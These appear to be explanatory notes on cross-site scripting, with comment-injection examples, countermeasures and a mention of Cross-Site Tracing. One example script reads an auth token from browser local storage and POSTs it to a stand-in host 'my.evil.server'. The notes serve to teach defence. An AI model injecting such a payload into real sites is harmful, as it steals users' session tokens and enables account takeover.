# XSS

Cross site scripting (XSS) is an attack where one runs a script (typically
JavaScript) in another user's browser. This can happen if user inputs are not
correctly sanitized and then displayed back to users.

XSS can be used for

- stealing stored data in browser local storage
- steal cookies (unless they are server-side read-only)
- modify DOM and trigger DOM events
- send requests (especially dangerous if cookie-based authentication is used)

For example, assume we have a social media site wheres user can post comments.
The comments are rendered server side using a template language (although it is
as much of a vulnerability for client-side rendering)

```html
<div>
  <p>{comment}</p>
</div>
```

A malicious user posts the following comment

```html
<script>
  alert("XSS");
</script>
```

When any user attempt to see this comment, the HTML renders as below which
executes the malicious script.

```html
<div>
  <p>
    <script>
      alert("XSS");
    </script>
  </p>
</div>
```

## Accessing Local Storage

Here is a vulnerability from an app I was working. This attack could grab a
token in persisted Redux store and send it to an evil server.

```html
<script>
  {
    const root = window.localStorage["persist:root"];
    const auth = JSON.parse(root).auth;

    const url = "my.evil.server:5001";
    window.fetch(url, { method: "POST", body: auth });
  }
</script>
```

## Countermeasures

The best protection against XSS is to make sure all user input is sanitized and
that no vulnerable data is stored in local storage or browser readable cookies.

## XST

There is something called Cross-Site Tracing (XST) where one uses a HTTP Track
request to bypass the `httpOnly` attribute in a cookie. To protect against XST,
make sure Track requests are disabled (especially from JavaScript).
